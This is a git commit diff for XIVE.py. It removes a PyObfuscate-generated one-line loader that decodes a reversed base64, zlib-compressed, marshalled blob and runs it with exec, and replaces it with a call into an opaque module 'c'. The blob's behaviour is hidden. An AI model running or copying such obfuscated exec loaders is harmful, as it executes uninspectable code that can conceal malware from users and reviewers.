4e276d63c4a87d188339987ab7ea04ab7593a0d8
xive7 <mdahnaf094@gmail.com>
2025-12-14 12:08:55 +0600

    Add files via upload

--- XIVE.py
+++ XIVE.py
@@ -1,5 +1,2 @@
-# Obfuscated with PyObfuscate
-# https://www.github.com/htr-tech
-# Time : Sun Dec 14 12:01:05 2025
-# -------------------------------
-_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=InIWzFAUAqNikuBVR+giIfQdOHzVDcy4CZZeLjMzAjPkYALQBsxbAg4rUbSNnyTNnMsi3N2UtdM/paQfyQl4j/nXBz/gAIgHjH+e2SxkhQuxsIfJfa5gcFMPjA+4jvrtMuJmCylm3kJKZoR5ADAAXmYOXZDcVmSUiAyFjxyQOMmCDpwQ6MmQWxs6DFTCAkZLxJe'))
+from c import ___XIVE___
+___XIVE___().___MENUXD__()
